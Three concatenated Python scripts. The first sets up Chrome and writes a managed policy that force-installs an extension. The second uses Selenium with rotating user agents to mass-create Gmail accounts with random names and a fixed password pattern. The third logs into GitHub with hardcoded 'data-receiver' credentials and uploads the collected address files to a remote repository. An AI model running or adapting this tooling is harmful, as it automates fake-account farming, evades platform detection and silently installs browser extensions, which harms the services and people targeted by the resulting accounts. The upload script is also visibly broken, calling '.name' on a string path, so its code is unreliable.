import os
import subprocess
import sys
import urllib.request

def is_tool_installed(tool_name):
    """Check whether `tool_name` is on PATH and marked as executable."""
    from shutil import which
    return which(tool_name) is not None

def download_chrome():
    """Download Google Chrome for Linux."""
    chrome_download_url = "https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb"
    file_name = chrome_download_url.split('/')[-1]
    
    # Check if file already exists
    if os.path.exists(file_name):
        print(f"Deleting existing file: {file_name}")
        os.remove(file_name)
    
    print("Downloading Google Chrome...")
    urllib.request.urlretrieve(chrome_download_url, file_name)
    return file_name

def install_chrome(file_name):
    """Install Google Chrome on Ubuntu."""
    subprocess.run(["sudo", "dpkg", "-i", file_name], check=True)
    subprocess.run(["sudo", "apt-get", "install", "-f", "-y"], check=True)

def ensure_chrome_installed():
    if not is_tool_installed("google-chrome"):
        print("Google Chrome is not installed.")
        file_name = download_chrome()
        print("Installing Google Chrome...")
        install_chrome(file_name)
        print("Google Chrome installed.")
    else:
        print("Google Chrome is already installed.")

def ensure_selenium_installed():
    try:
        import selenium
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "selenium"])
        print("Selenium installed.")
    else:
        print("Selenium is already installed.")

def ensure_chrome_driver_installed():
    if not is_tool_installed("chromedriver"):
        subprocess.check_call([sys.executable, "-m", "pip", "install", "chromedriver-autoinstaller"])
        import chromedriver_autoinstaller
        chromedriver_autoinstaller.install()
        print("Chrome WebDriver installed.")
    else:
        print("Chrome WebDriver is already installed.")

def ensure_policy_directory_exists():
    policy_dir = "/etc/opt/chrome/policies/managed"
    if not os.path.exists(policy_dir):
        os.makedirs(policy_dir)
        print(f"Created directory {policy_dir}")
    else:
        print(f"Directory {policy_dir} already exists")

def ensure_policy_file_exists():
    policy_file_path = "/etc/opt/chrome/policies/managed/managed_extensions_policy.json"
    policy_content = {
        "ExtensionInstallForcelist": [
            "jinjaccalgkegednnccohejagnlnfdag;https://clients2.google.com/service/update2/crx"
        ]
    }
    import json
    if not os.path.isfile(policy_file_path):
        with open(policy_file_path, 'w') as policy_file:
            json.dump(policy_content, policy_file, indent=2)
        print(f"Created policy file {policy_file_path}")
    else:
        print(f"Policy file {policy_file_path} already exists")

def main():
    ensure_chrome_installed()
    ensure_selenium_installed()
    ensure_chrome_driver_installed()
    ensure_policy_directory_exists()
    ensure_policy_file_exists()

if __name__ == "__main__":
    main()












import os
import traceback
import requests
import random
import time

from selenium.webdriver.chrome.options import Options
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import string

def random_string(length=8):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))

def getUserAgents(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            user_agents = response.text.split('\n')
            return user_agents
        else:
            print("Could not fetch user agents. Using default user agent.")
            return []
    except requests.RequestException as e:
        print("Error fetching user agents:", e)
        return []

def createGmailAccount(driver, wait):
    try:
        driver.get("https://www.gmail.com")

        create_account_button = wait.until(EC.presence_of_element_located((By.XPATH, "//a[text()='Create account']")))
        create_account_button.click()

        time.sleep(5)

        first_name_text = random_string(8)
        last_name_text = random_string(10)
        username_text = random_string(10) + "12345"
        password_text = f"DARKness2006!!!!!{username_text}@gmail.com"  # Constant password with username

        first_name = wait.until(EC.element_to_be_clickable((By.ID, "firstName")))
        first_name.send_keys(first_name_text)

        last_name = driver.find_element(By.ID, "lastName")
        last_name.send_keys(last_name_text)

        username = driver.find_element(By.ID, "username")
        username.send_keys(username_text)

        password = driver.find_element(By.NAME, "Passwd")
        password.send_keys(password_text)

        confirm_password = driver.find_element(By.NAME, "ConfirmPasswd")
        confirm_password.send_keys(password_text)

        next_button = driver.find_element(By.XPATH, "//div[@id='accountDetailsNext']/div/button")
        next_button.click()

        wait.until(EC.presence_of_element_located((By.ID, "phoneNumberId")))

        return f"{username_text}@gmail.com"

    except Exception as e:
        print("An error occurred:", e)
        traceback.print_exc()
        return None

def saveToTextFile(gmail_address, file_path):
    try:
        with open(file_path, "a") as file:
            file.write(f"{gmail_address}\n")
        return True
    except Exception as e:
        print("Error saving to file:", e)
        return False

def createMultipleAccounts(driver, wait, user_agents):
    gmail_count = 0
    file_number = 0
    max_gmails = 100
    gmails_per_file = 10
    max_files = max_gmails // gmails_per_file

    for user_agent in user_agents:
        options = Options()
        options.add_argument(f"user-agent={user_agent}")
        options.add_argument("--start-maximized")
        driver = webdriver.Chrome(options=options)
        wait = WebDriverWait(driver, 50)

        for _ in range(max_gmails):
            gmail_address = createGmailAccount(driver, wait)
            if gmail_address:
                gmail_count += 1
                if gmail_count % gmails_per_file == 0:
                    file_number += 1
                if file_number > max_files:
                    break











                file_name = f"b-{str(file_number).zfill(2)}.txt"












                file_path = os.path.abspath(file_name)
                if not saveToTextFile(gmail_address, file_path):
                    print("Failed to save to file.")
                    break

def main():
    userAgentsUrl = "https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt"
    user_agents = getUserAgents(userAgentsUrl)

    if user_agents:
        chrome_options = Options()
        chrome_options.add_argument("--headless")  # Run browser in background
        chrome_options.add_argument("--disable-gpu")
        driver = webdriver.Chrome(options=chrome_options)
        wait = WebDriverWait(driver, 10)
        createMultipleAccounts(driver, wait, user_agents)
        driver.quit()
    else:
        print("No user agents fetched.")

if __name__ == "__main__":
    main()







import requests
import base64
import time

def authenticate_github(email, password):
    # Authenticate with GitHub using email and password
    try_count = 0
    while try_count < 3:  # Retry up to 3 times
        try:
            response = requests.post(
                "https://api.github.com/authorizations",
                auth=(email, password),
                json={"scopes": ["repo"], "note": "Script access"}
            )
            if response.status_code == 201:
                token = response.json()["token"]
                return token
            else:
                print("Failed to authenticate with GitHub. Retrying...")
        except requests.RequestException as e:
            print(f"Error during authentication: {e}. Retrying...")
        try_count += 1
        time.sleep(3)  # Wait for 3 seconds before retrying
    print("Failed to authenticate with GitHub after multiple attempts.")
    return None

def upload_file(token, repo_owner, repo_name, file_path, folder_name):
    # Upload a file to the repository
    try_count = 0
    while try_count < 3:  # Retry up to 3 times
        try:
            headers = {"Authorization": f"token {token}"}
            with open(file_path, "rb") as file:
                content = base64.b64encode(file.read()).decode()
            data = {
                "message": "Upload file",
                "content": content,
                "branch": "main"
            }
            response = requests.put(
                f"https://api.github.com/repos/{repo_owner}/{repo_name}/contents/{folder_name}/{file_path.name}",
                headers=headers,
                json=data
            )
            if response.status_code == 201:
                print(f"File '{file_path.name}' uploaded successfully.")
                return True
            else:
                print(f"Failed to upload file '{file_path.name}'. Retrying...")
        except requests.RequestException as e:
            print(f"Error during file upload: {e}. Retrying...")
        try_count += 1
        time.sleep(3)  # Wait for 3 seconds before retrying
    print("Failed to upload file after multiple attempts.")
    return False




def main():
    # Your GitHub credentials
    email = "data-receiver@omail.edu.pl"
    password = "data-receiver@omail.edu.pl"

    # Authenticate with GitHub
    token = authenticate_github(email, password)
    if token:
        # Repository information
        repo_owner = "Data-Receiver"
        repo_name = "Data"
        folder_name = "Gmails"




        # Upload files to the existing folder
        for i in range(1, 11):
            file_path = f"b-{str(i).zfill(2)}.txt"  # Assuming file names follow the pattern b-01.txt, b-02.txt, ..., b-10.txt
            if not upload_file(token, repo_owner, repo_name, file_path, folder_name):
                print(f"Failed to upload file '{file_path}'. Exiting...")
                break
    else:
        print("Authentication failed. Please check your credentials.")

if __name__ == "__main__":
    main()
